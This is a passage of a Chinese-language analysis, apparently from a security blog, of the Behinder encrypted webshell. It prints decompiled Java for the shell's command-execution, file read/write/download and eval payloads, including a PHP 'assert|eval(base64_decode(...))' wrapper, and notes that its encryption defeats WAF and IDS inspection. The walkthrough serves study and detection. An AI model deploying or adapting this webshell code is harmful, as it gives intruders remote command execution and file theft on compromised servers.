+<p>明白了上面getBasicInfo的过程的话，runCmd这部分其实就好理解了，大体过程和上面getBasicInfo差不多，只是动态生成的payload字节数组不同。输入要执行的命令，可以看到在ShellService.runCmd里，也是调用Utils.getData和Utils.requestAndParse，然后解密和解码返回的数据，再返回出去显示。</p>
+<pre><code>public JSONObject runCmd(String cmd) throws Exception {
+    Map&lt;String, String&gt; params = new LinkedHashMap();
+    params.put("cmd", cmd);
+    byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
+    Map&lt;String, Object&gt; resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+    byte[] resData = (byte[])resultObj.get("data");
+    String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+    resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
+    JSONObject result = new JSONObject(resultTxt);
+    Iterator var9 = result.keySet().iterator();
+
+    while(var9.hasNext()) {
+        String key = (String)var9.next();
+        result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
+    }
+
+    return result;
+}</code></pre>
+<p>这是Utils.getData里className就是net.rebeyond.behinder.payload.java.cmd</p>
+<pre><code>byte[] bincls;
+byte[] encrypedBincls;
+if (type.equals("jsp")) {
+    className = "net.rebeyond.behinder.payload.java." + className;
+    bincls = Params.getParamedClass(className, params);
+    if (extraData != null) {
+        bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
+    }
+
+    encrypedBincls = Crypt.Encrypt(bincls, key);
+    String basedEncryBincls = Base64.encode(encrypedBincls);
+    return basedEncryBincls.getBytes();</code></pre>
+<p>跟进这个Cmd类，入口还是equais方法，在equals里的核心就是这个RunCMD方法，接收传入的cmd，判断是windows还是linux，然后执行命令并返回命令执行结果</p>
+<pre><code>public boolean equals(Object obj) {
+        PageContext page = (PageContext)obj;
+        this.Session = page.getSession();
+        this.Response = page.getResponse();
+        this.Request = page.getRequest();
+        page.getResponse().setCharacterEncoding("UTF-8");
+        HashMap result = new HashMap();
+
+        try {
+            result.put("msg", this.RunCMD(cmd));
+            result.put("status", "success");
+        } catch (Exception var13) {
+            result.put("msg", var13.getMessage());
+            result.put("status", "success");
+        } finally {
+            try {
+                ServletOutputStream so = this.Response.getOutputStream();
+                so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                so.flush();
+                so.close();
+                page.getOut().clear();
+            } catch (Exception var12) {
+                var12.printStackTrace();
+            }
+
+        }
+
+        return true;
+    }
+
+    private String RunCMD(String cmd) throws Exception {
+        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
+        String result = "";
+        if (cmd != null &amp;&amp; cmd.length() &gt; 0) {
+            Process p;
+            if (System.getProperty("os.name").toLowerCase().indexOf("windows") &gt;= 0) {
+                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
+            } else {
+                p = Runtime.getRuntime().exec(cmd);
+            }
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
+
+            for(String disr = br.readLine(); disr != null; disr = br.readLine()) {
+                result = result + disr + "\n";
+            }
+
+            result = new String(result.getBytes(osCharset));
+        }
+
+        return result;
+    }</code></pre>
+<p>将命令执行结果加密base64编码然后返回</p>
+<pre><code>try {
+    ServletOutputStream so = this.Response.getOutputStream();
+    so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+    so.flush();
+    so.close();
+    page.getOut().clear();
+} catch (Exception var12) {
+    var12.printStackTrace();
+}</code></pre>
+<p>ShellService.runCmd方法解密数据并返回</p>
+<pre><code>public JSONObject runCmd(String cmd) throws Exception {
+    Map&lt;String, String&gt; params = new LinkedHashMap();
+    params.put("cmd", cmd);
+    byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
+    Map&lt;String, Object&gt; resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+    byte[] resData = (byte[])resultObj.get("data");
+    String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+    resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
+    JSONObject result = new JSONObject(resultTxt);
+    Iterator var9 = result.keySet().iterator();
+
+    while(var9.hasNext()) {
+        String key = (String)var9.next();
+        result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
+    }
+
+    return result;
+}</code></pre>
+<p>CmdUtil显示返回数据</p>
+<pre><code>try {
+    int lines = cmdView.getText().split("\n").length;
+    String lastLine = cmdView.getText().split("\n")[lines - 1];
+    String cmd = lastLine.substring(lastLine.indexOf(pwd) + pwd.length());
+    JSONObject resultObj = this.currentShellService.runCmd(cmd);
+    if (resultObj.getString("status").equals("success")) {
+        cmdView.insert("\n" + resultObj.getString("msg") + "\n");
+        cmdView.insert(pwd);
+        this.statusLabel.setText("命令执行完成");
+        this.currentPos = cmdView.getCaretPosition();
+    } else {
+        cmdView.insert("\n" + resultObj.getString("msg") + "\n");
+        cmdView.insert(pwd);
+        this.statusLabel.setText("命令执行失败:" + resultObj.getString("msg"));
+    }
+
+    e.doit = false;
+} catch (Exception var10) {
+    e.doit = false;
+    var10.printStackTrace();
+    this.statusLabel.setText(var10.getMessage());
+    var10.printStackTrace();
+}</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200227145608-3aec6afa-592e-1.png"/></p>
+<p>命令执行完成</p>
+<h1 data-content="1" id="abca5b95e6571cf69b8c51526ad24ce9">0x06 文件管理 FileOperation</h1>
+<p>文件管理的过程其实也是和上面getBasicInfo和runCmd的过程类似，整个代码执行的过程在net.rebeyond.behinder.ui.FileManagerUtils，在这个类里面定义了listFile，downloadFile，deleteFile，openFile，showFile，saveFile，uploadFile等常用操作，但是FileManagerUtils只负责界面部分，逻辑部分则调用ShellService的相应方法来实现。</p>
+<p>ShellService里面对于文件管理定义了listFiles，deleteFile，showFile，doanloadFile，uploadFile，appendFile等方法，在这些方法里面代码逻辑也是比较相似，调用Utils.getData和Utils.requestAndParse来获取要发送到服务端执行的payload的加密和base64编码的class字节数组，并通过requestAndParse发送和获取返回的执行结果，所以核心部分还是在net.rebeyond.behinder.payload.java.FileOperation类里面。</p>
+<p>net.rebeyond.behinder.payload.java.FileOperation执行payload的入口是equals方法，并通过mode这个静态公有变量来判断用户在客户端执行的操作和调用相应的方法，list，show，delete，create，append，doawload等。</p>
+<pre><code>try {
+        if (mode.equalsIgnoreCase("list")) {
+            ((Map)result).put("msg", this.list(page));
+            ((Map)result).put("status", "success");
+        } else if (mode.equalsIgnoreCase("show")) {
+            ((Map)result).put("msg", this.show(page));
+            ((Map)result).put("status", "success");
+        } else if (mode.equalsIgnoreCase("delete")) {
+            result = this.delete(page);
+        } else if (mode.equalsIgnoreCase("create")) {
+            ((Map)result).put("msg", this.create(page));
+            ((Map)result).put("status", "success");
+        } else if (mode.equalsIgnoreCase("createDir")) {
+            this.createDir(page);
+        } else if (mode.equalsIgnoreCase("append")) {
+            ((Map)result).put("msg", this.append(page));
+            ((Map)result).put("status", "success");
+        } else if (mode.equalsIgnoreCase("download")) {
+            this.download(page);
+            return true;
+        }
+    } catch (Exception var6) {
+        ((Map)result).put("msg", var6.getMessage());
+        ((Map)result).put("status", "fail");
+    }</code></pre>
+<p>list方法，列出指定路径下的文件，判断path是目录还是文件，是目录的那就遍历目录下的文件并获取每个文件的基本信息，包括文件类型，文件名，文件大小，文件读写执行的权限和上次修改的时间，文件的那就直接获取文件的基本信息。</p>
+<pre><code>private String list(PageContext page) throws Exception {
+    String result = "";
+    File f = new File(path);
+    List&lt;Map&lt;String, String&gt;&gt; objArr = new ArrayList();
+    if (f.isDirectory()) {
+        File[] var8;
+        int var7 = (var8 = f.listFiles()).length;
+
+        for(int var6 = 0; var6 &lt; var7; ++var6) {
+            File temp = var8[var6];
+            Map&lt;String, String&gt; obj = new HashMap();
+            obj.put("type", temp.isDirectory() ? "directory" : "file");
+            obj.put("name", temp.getName());
+            obj.put("size", String.valueOf(temp.length()));
+            obj.put("perm", temp.canRead() + "," + temp.canWrite() + "," + temp.canExecute());
+            obj.put("lastModified", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(temp.lastModified())));
+            objArr.add(obj);
+        }
+    } else {
+        Map&lt;String, String&gt; obj = new HashMap();
+        obj.put("type", f.isDirectory() ? "directory" : "file");
+        obj.put("name", new String(f.getName().getBytes(this.osCharset), "GBK"));
+        obj.put("size", String.valueOf(f.length()));
+        obj.put("lastModified", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(f.lastModified())));
+        objArr.add(obj);
+    }
+
+    result = this.buildJsonArray(objArr, true);
+    return result;
+}</code></pre>
+<p>create方法，创建文件，在ShellService里upload方法就是调用create方法来上传文件。这里也比较常规，就是接收要写入的内容并打开输出流，将内容输出到文件，这里要注意接收回来的数据是经过了base64编码，所以要先进行base64解码再输出到文件。</p>
+<pre><code>private String create(PageContext page) throws Exception {
+    String result = "";
+    FileOutputStream fso = new FileOutputStream(path);
+    fso.write((new BASE64Decoder()).decodeBuffer(content));
+    fso.flush();
+    fso.close();
+    result = path + "上传完成，远程文件大小:" + (new File(path)).length();
+    return result;
+}</code></pre>
+<p>doanload方法，show方法也比较简单，doanload方法打开一个FileInputStream，show打开一个InputStreamReader，然后通过while循环读取文件内容并返回给客户端</p>
+<pre><code>private void download(PageContext page) throws Exception {
+    FileInputStream fis = new FileInputStream(path);
+    byte[] buffer = new byte[1024000];
+    int length = false;
+    ServletOutputStream sos = page.getResponse().getOutputStream();
+
+    int length;
+    while((length = fis.read(buffer)) &gt; 0) {
+        sos.write(Arrays.copyOfRange(buffer, 0, length));
+    }
+
+    sos.flush();
+    sos.close();
+    fis.close();
+}
+private String show(PageContext page) throws Exception {
+    if (charset == null) {
+        charset = System.getProperty("file.encoding");
+    }
+
+    StringBuffer sb = new StringBuffer();
+    File f = new File(path);
+    if (f.exists() &amp;&amp; f.isFile()) {
+        InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
+        BufferedReader br = new BufferedReader(isr);
+        String str = null;
+
+        while((str = br.readLine()) != null) {
+            sb.append(str + "\n");
+        }
+
+        br.close();
+        isr.close();
+    }
+
+    return sb.toString();
+}</code></pre>
+<p>上面的文件操作方法比较简单也比较常规。完成了以上操作之后，就将执行结果base64编码并转换成json格式，然后用之前连接的时候协商的密匙进行aes加密并将密文返回给客户端。</p>
+<pre><code>try {
+    ServletOutputStream so = this.Response.getOutputStream();
+    so.write(this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
+    so.flush();
+    so.close();
+    page.getOut().clear();
+} catch (Exception var5) {
+    var5.printStackTrace();
+}
+
+return true;</code></pre>
+<p>客户端接收到返回的结果之后Shellservice再解密，解析json格式字符串，base64解码并返回到FileManagerUtils，然后FileManagerUtils再在界面上显示出明文信息。至此，FileManagerUtils部分结束。整个逻辑也是比较简单的，常规的。</p>
+<p>其实在密匙协商和连接建立之后的getBasicInfo或者runCmd理解了之后，可以发现后面的FileManagerUtil，以及其它的功能比如DBManager，ConnectBack都是类似的逻辑，XXXUtils（DBManagerUtils，ConnectBackUtils）调用ShellService对应的方法，然后调用Utils.getData和Utils.requestAndParse方法获取要发送到服务端执行的payload的加密base64编码的class字节数组并将服务端执行后的返回结果返回给XXXUtils，XXXUtils在再根据结果进行相应处理。但是下面这个eval执行自定义代码却有点不一样，我们一起来看一下。</p>
+<h1 data-content="1" id="dd30e2447a2ace69db03fa03921d954c">0x07 自定义代码执行 eval</h1>
+<p>EvalUtils的execute方法调用ShellService的eval方法，eval方法先调用Utils.getClassFromSourceCode将执行的代码转换成为class字节数组，然后就和上面的有一点不同，不调用熟悉的getData，而是调用getEvalData，然后再调用requestAndParse。</p>
+<pre><code>public String eval(String sourceCode) throws Exception {
+    String result = null;
+    byte[] payload = null;
+    byte[] payload;
+    if (this.currentType.equals("jsp")) {
+        payload = Utils.getClassFromSourceCode(sourceCode);
+    } else {
+        payload = sourceCode.getBytes();
+    }
+
+    byte[] data = Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload);
+    Map&lt;String, Object&gt; resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+    byte[] resData = (byte[])resultObj.get("data");
+    result = new String(resData);
+    return result;
+}</code></pre>
+<p>在getEvalData里面，对传进来的class字节数组加密和base64编码，然后再返回给ShellService.eval方法，然后再requestAndParse，所以其实getClassFromSourceCode和getEvalData可以理解成就是一个getData，只是获取payload的class字节数组的方式不同。</p>
+<pre><code>public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
+    byte[] result = null;
+    byte[] encrypedBincls;
+    if (type.equals("jsp")) {
+        encrypedBincls = Crypt.Encrypt(payload, key);
+        String basedEncryBincls = Base64.encode(encrypedBincls);
+        result = basedEncryBincls.getBytes();
+    } else if (type.equals("php")) {
+        encrypedBincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
+        byte[] encrypedBincls = Crypt.EncryptForPhp(encrypedBincls, key, encryptType);
+        result = Base64.encode(encrypedBincls).getBytes();
+    } else if (type.equals("aspx")) {
+        Map&lt;String, String&gt; params = new LinkedHashMap();
+        params.put("code", new String(payload));
+        result = getData(key, encryptType, "Eval", params, type);
+    } else if (type.equals("asp")) {
+        encrypedBincls = Crypt.EncryptForAsp(payload, key);
+        result = encrypedBincls;
+    }
+
+    return result;
+}
+
+public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
+    return Run.getClassFromSourceCode(sourceCode);
+}</code></pre>
+<p>作者在ShellService里面调用的是Utils.getClassFromSource方法然后再调用Run的getClassFromSourceCode方法，而不是调用Utils.getData的方法来获取class字节数组。其实这里细心的话就可以发现，如果是采用前面Utils.getData的方式来获取的话，payload是已经在代码里面写好了，只需要传入参数，而现在的问题就在于payload是由使用者在客户端来编写的，而不是简单的传个参数就可以，所以这里才使用了Run.getClassFromSourceCode这种方式来获取payload的class字节数组而不是采用Utils.getData来获取payload的class字节数组。</p>
+<p>net.rebeyond.behinder.utils.jc.Run.getClassFromSourceCode方法</p>
+<pre><code>public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
+        byte[] classBytes = null;
+        Pattern CLASS_PATTERN = Pattern.compile("class\\s+([$_a-zA-Z][$_a-zA-Z0-9]*)\\s*");
+        Matcher matcher = CLASS_PATTERN.matcher(sourceCode);
+        if (matcher.find()) {
+            String cls = matcher.group(1);
+            JavaCompiler jc = ToolProvider.getSystemJavaCompiler();
+            if (jc == null) {
+                throw new Exception("本地机器上没有找到编译环境，请确认:1.是否安装了JDK环境;2." + System.getProperty("java.home") + File.separator + "lib目录下是否有tools.jar.");
+            } else {
+                StandardJavaFileManager standardJavaFileManager = jc.getStandardFileManager((DiagnosticListener)null, (Locale)null, (Charset)null);
+                JavaFileManager fileManager = new CustomClassloaderJavaFileManager(Run.class.getClassLoader(), standardJavaFileManager);
+                JavaFileObject javaFileObject = new MyJavaFileObject(cls, sourceCode);
+                List&lt;String&gt; options = new ArrayList();
+                options.add("-source");
+                options.add("1.6");
+                options.add("-target");
+                options.add("1.6");
+                DiagnosticCollector&lt;JavaFileObject&gt; collector = new DiagnosticCollector();
+                CompilationTask cTask = jc.getTask((Writer)null, fileManager, collector, options, (Iterable)null, Arrays.asList(javaFileObject));
+                boolean result = cTask.call();
+                if (!result) {
+                    List&lt;Diagnostic&lt;? extends JavaFileObject&gt;&gt; diagnostics = collector.getDiagnostics();
+                    Iterator var15 = diagnostics.iterator();
+                    if (var15.hasNext()) {
+                        Diagnostic&lt;? extends JavaFileObject&gt; diagnostic = (Diagnostic)var15.next();
+                        throw new Exception(diagnostic.getMessage((Locale)null));
+                    }
+                }
+
+                JavaFileObject fileObject = (JavaFileObject)CustomClassloaderJavaFileManager.fileObjects.get(cls);
+                if (fileObject != null) {
+                    classBytes = ((MyJavaFileObject)fileObject).getCompiledBytes();
+                }
+
+                return classBytes;
+            }
+        } else {
+            throw new IllegalArgumentException("No such class name in " + sourceCode);
+        }
+    }
+}</code></pre>
+<h1 data-content="1" id="62f3b6c2fb587538b0c37e4288964de5">0x08 总结</h1>
+<p>其实理解冰蝎整个编写思路并不难，里面的功能（获取服务器基本信息，执行系统命令，文件管理，数据库管理，反弹meterpreter，执行自定义代码等）大致的过程都比较类似。都是在对应的XXXUtils里面调用ShellService的各个对应方法，然后ShellService里面又调用Utils的getData来获取要执行的payload的加密字节数组，在Utils.requestAndParse里发送加密和base64编码的字节数组和接收返回结果，再将返回结果交给ShellService和XXXUtils进行处理。最核心的部分还是在密匙协商那部分，BasicInfoUtils.getBasicInfo-&gt;ShellService构造方法-&gt;Utils.getKeyAndCookie，这部分也是waf，ids，ips在检测冰蝎的时候最关注的部分，只要密匙协商和连接成功建立，waf，ids等流量安全设备基本上就面对加密的数据束手无策。大家进行分析的时候，可以由这部分开始进行分析，这部分明朗了之后后面的分析基本上就会水到渠成。</p>
+<p>参开链接：<br/>
+<a href="https://xz.aliyun.com/t/2744" target="_blank">https://xz.aliyun.com/t/2744</a> 利用动态二进制加密实现新型一句话木马之Java篇 冰蝎</p>
+</div>
+</div>
